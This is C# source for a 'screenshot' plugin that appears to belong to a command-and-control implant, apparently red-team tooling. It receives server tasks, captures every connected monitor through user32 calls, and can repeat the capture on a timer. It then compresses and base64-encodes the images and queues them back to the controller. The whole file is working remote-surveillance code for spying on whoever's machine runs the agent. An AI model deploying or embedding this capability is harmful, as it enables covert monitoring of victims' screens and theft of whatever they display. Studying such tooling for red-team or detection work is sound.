﻿using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Threading.Tasks;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using screenshot;

namespace Agent
{
    public class Plugin : IPlugin, IDisposable
    {
        public string Name => "screenshot";
        private IMessageManager messageManager { get; set; }
        private System.Timers.Timer screenshotTimer;

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            ScreenshotArgs args = JsonSerializer.Deserialize<ScreenshotArgs>(job.task.parameters);

            try
            {
                if (args.interval <= 0)
                {
                    await CaptureAndSendScreenshot(job.task.id);
                }
                else
                {
                    screenshotTimer = new System.Timers.Timer(args.interval * 1000); // Convert seconds to milliseconds
                    screenshotTimer.Elapsed += async (sender, e) => await CaptureAndSendScreenshot(job.task.id);

                    // Set AutoReset to false for a one-time execution if the interval is greater than 0
                    screenshotTimer.AutoReset = args.interval > 0;
                    screenshotTimer.Enabled = true;
                    await messageManager.AddResponse(new ResponseResult
                    {
                        completed = true,
                        user_output = $"Capturing screenshots every {args.interval} seconds.",
                        task_id = job.task.id,
                    });
                }
            }
            catch (Exception ex)
            {
                await HandleExecutionError(job.task.id, ex);
            }
        }

        private async Task HandleExecutionError(string task_id, Exception ex)
        {
            string errorMessage = $"An error occurred during the execution: {ex.Message}";
            await messageManager.Write(errorMessage, task_id, true, "error");

            // Log the error using your logger
            // logger.LogError(errorMessage);
        }

        private async Task CaptureAndSendScreenshot(string task_id)
        {
            try
            {
                var bitmaps = ScreenCapture.Capture();

                int combinedWidth = 0;
                int maxHeight = 0;
                foreach (var bitmap in bitmaps)
                {
                    combinedWidth += bitmap.Width;
                    if (bitmap.Height > maxHeight)
                    {
                        maxHeight = bitmap.Height;
                    }
                }

                var combinedBitmap = new Bitmap(combinedWidth, maxHeight);

                int x = 0;
                foreach (var bitmap in bitmaps)
                {
                    using (var graphics = Graphics.FromImage(combinedBitmap))
                    {
                        graphics.DrawImage(bitmap, x, 0);
                    }
                    x += bitmap.Width;
                }

                var converter = new ImageConverter();
                var combinedBitmapBytes = (byte[])converter.ConvertTo(combinedBitmap, typeof(byte[]));
                byte[] outputBytes;

                using (var memoryStream = new MemoryStream())
                {
                    using (var gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
                    {
                        gzipStream.Write(combinedBitmapBytes, 0, combinedBitmapBytes.Length);
                    }
                    outputBytes = memoryStream.ToArray();
                }

                var combinedBitmapBase64 = Convert.ToBase64String(outputBytes);
                await messageManager.AddResponse(new ResponseResult
                {
                    completed = true,
                    user_output = "Screenshot captured.",
                    task_id = task_id,
                    process_response = new Dictionary<string, string> { { "message", combinedBitmapBase64 } },
                });
            }
            catch (Exception e)
            {
                await messageManager.Write($"Failed to capture screenshot: {e.ToString()}", task_id, true, "error");
            }
        }

        public void Dispose()
        {
            screenshotTimer?.Dispose();
        }
    }

    internal class ScreenCapture
    {
        internal static List<Bitmap> Capture()
        {
            var bitmaps = new List<Bitmap>();
            foreach (var screen in GetScreens())
            {
                var bitmap = new Bitmap(screen.Width, screen.Height);
                using (var graphics = Graphics.FromImage(bitmap))
                {
                    graphics.CopyFromScreen(screen.X, screen.Y, 0, 0, bitmap.Size);
                }
                bitmaps.Add(bitmap);
            }
            return bitmaps;
        }

        private static IEnumerable<Screen> GetScreens()
        {
            var screens = new List<Screen>();
            foreach (var displayInfo in GetDisplayInfos())
            {
                var bounds = new Rectangle(
                    displayInfo.Bounds.X,
                    displayInfo.Bounds.Y,
                    displayInfo.Bounds.Width,
                    displayInfo.Bounds.Height);

                screens.Add(new Screen(bounds));
            }
            return screens;
        }

        private class Screen
        {
            public int X { get; }
            public int Y { get; }
            public int Width { get; }
            public int Height { get; }

            public Screen(Rectangle bounds)
            {
                X = bounds.X;
                Y = bounds.Y;
                Width = bounds.Width;
                Height = bounds.Height;
            }
        }

        [DllImport("user32.dll")]
        private static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, MonitorEnumProc lpfnEnum, IntPtr dwData);

        private delegate bool MonitorEnumProc(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int left;
            public int top;
            public int right;
            public int bottom;
        }

        private class DisplayInfo
        {
            public Rectangle Bounds { get; set; }
        }

        private static List<DisplayInfo> GetDisplayInfos()
        {
            var monitors = new List<DisplayInfo>();

            var proc = new MonitorEnumProc((IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
            {
                var mi = new DisplayInfo();
                mi.Bounds = new Rectangle(lprcMonitor.left, lprcMonitor.top, lprcMonitor.right - lprcMonitor.left, lprcMonitor.bottom - lprcMonitor.top);
                monitors.Add(mi);

                return true;
            });

            if (!EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, proc, IntPtr.Zero))
            {
                throw new System.ComponentModel.Win32Exception();
            }

            return monitors;
        }
    }
}
